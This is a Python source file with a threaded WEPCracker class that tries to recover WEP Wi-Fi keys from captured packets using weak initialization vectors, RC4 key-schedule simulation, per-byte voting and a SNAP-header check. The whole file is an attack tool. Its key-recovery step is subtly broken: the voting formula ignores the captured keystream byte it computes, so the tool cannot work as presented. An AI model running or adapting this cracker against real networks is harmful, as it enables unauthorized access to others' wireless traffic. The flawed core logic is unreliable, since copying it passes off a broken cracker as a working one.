import threading
import time
from collections import defaultdict


class WEPCracker:
    def __init__(self):
        self.is_cracking = False
        self.crack_thread = None
        self.key_found = False
        self.cracked_key = None
        self.progress = 0
        self.on_progress_update = None
        self.key_length = 5
        self.lock = threading.Lock()
    
    def rc4_ksa(self, key):
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]
        return S
    
    def rc4_prga(self, S):
        i = 0
        j = 0
        while True:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            K = S[(S[i] + S[j]) % 256]
            yield K
    
    def get_keystream_byte(self, iv, key, byte_index):
        full_key = list(iv) + list(key)
        S = self.rc4_ksa(full_key)
        prga = self.rc4_prga(S)
        for i in range(byte_index + 1):
            byte = next(prga)
        return byte
    
    def filter_weak_ivs(self, ivs, target_byte):
        weak_ivs = []
        for iv_data in ivs:
            iv = iv_data[0]
            if iv[2] == 255 and iv[1] >= 3 and (iv[0] & 0x1F) == (target_byte + 3):
                weak_ivs.append(iv_data)
        return weak_ivs
    
    def crack_byte(self, weak_ivs, known_key, target_byte):
        if len(weak_ivs) < 50:
            return None
        
        votes = defaultdict(int)
        
        for iv_data in weak_ivs:
            iv = iv_data[0]
            
            S = list(range(256))
            j = 0
            
            for i in range(target_byte + 4):
                if i < 3:
                    key_byte = iv[i]
                else:
                    key_byte = known_key[i - 3]
                
                j = (j + S[i] + key_byte) % 256
                S[i], S[j] = S[j], S[i]
            
            if S[1] < target_byte + 4 and S[S[1]] < target_byte + 4:
                z = iv_data[3] if len(iv_data) > 3 else 0
                
                key_byte_candidate = (S.index(target_byte + 3) - j - S[target_byte + 3]) % 256
                votes[key_byte_candidate] += 1
        
        if votes:
            best_byte = max(votes.items(), key=lambda x: x[1])
            if best_byte[1] >= 10:
                return best_byte[0]
        return None
    
    def verify_key(self, iv, key, encrypted):
        try:
            full_key = list(iv) + list(key)
            S = self.rc4_ksa(full_key)
            prga = self.rc4_prga(S)
            
            decrypted = []
            for byte in encrypted:
                ks_byte = next(prga)
                decrypted.append(byte ^ ks_byte)
            
            snap_header = bytes(decrypted[:6])
            return snap_header == b'\xaa\xaa\x03\x00\x00\x00'
        except:
            return False
    
    def crack_key(self, weak_ivs_list, key_length=5):
        self.key_length = key_length
        known_key = []
        
        for byte_pos in range(key_length):
            with self.lock:
                self.progress = (byte_pos / key_length) * 100
            
            if self.on_progress_update:
                self.on_progress_update(self.progress, None)
            
            filtered_ivs = self.filter_weak_ivs(weak_ivs_list, byte_pos)
            
            if len(filtered_ivs) < 50:
                time.sleep(0.5)
                continue
            
            key_byte = self.crack_byte(filtered_ivs, known_key, byte_pos)
            
            if key_byte is not None:
                known_key.append(key_byte)
            else:
                for candidate in range(256):
                    test_key = known_key + [candidate]
                    if len(weak_ivs_list) > 0:
                        test_iv = weak_ivs_list[0][0]
                        test_encrypted = weak_ivs_list[0][3:] if len(weak_ivs_list[0]) > 3 else [0] * 10
                        if self.verify_key(test_iv, test_key, test_encrypted):
                            known_key.append(candidate)
                            break
                else:
                    known_key.append(0)
            
            time.sleep(0.1)
        
        if len(known_key) == key_length:
            with self.lock:
                self.key_found = True
                self.cracked_key = bytes(known_key)
                self.progress = 100
            
            if self.on_progress_update:
                self.on_progress_update(100, self.cracked_key.hex())
            
            return self.cracked_key
        
        return None
    
    def start_cracking(self, weak_ivs_getter, key_length=5):
        if self.is_cracking:
            return
        
        self.is_cracking = True
        self.key_found = False
        self.cracked_key = None
        self.progress = 0
        
        def crack_thread():
            while self.is_cracking and not self.key_found:
                weak_ivs = weak_ivs_getter()
                
                iv_data_list = []
                for iv, keyid, packet in weak_ivs:
                    try:
                        wep_data = packet.load
                        if len(wep_data) > 4:
                            encrypted_data = list(wep_data[4:])
                            iv_data_list.append((iv, keyid, packet) + tuple(encrypted_data[:10]))
                    except:
                        pass
                
                if len(weak_ivs) >= 100:
                    result = self.crack_key(iv_data_list, key_length)
                    if result:
                        break
                
                time.sleep(1)
            
            self.is_cracking = False
        
        self.crack_thread = threading.Thread(target=crack_thread)
        self.crack_thread.daemon = True
        self.crack_thread.start()
    
    def stop_cracking(self):
        self.is_cracking = False
        if self.crack_thread:
            self.crack_thread.join(timeout=2)
    
    def get_status(self):
        with self.lock:
            return {
                'is_cracking': self.is_cracking,
                'key_found': self.key_found,
                'cracked_key': self.cracked_key.hex() if self.cracked_key else None,
                'progress': self.progress
            }
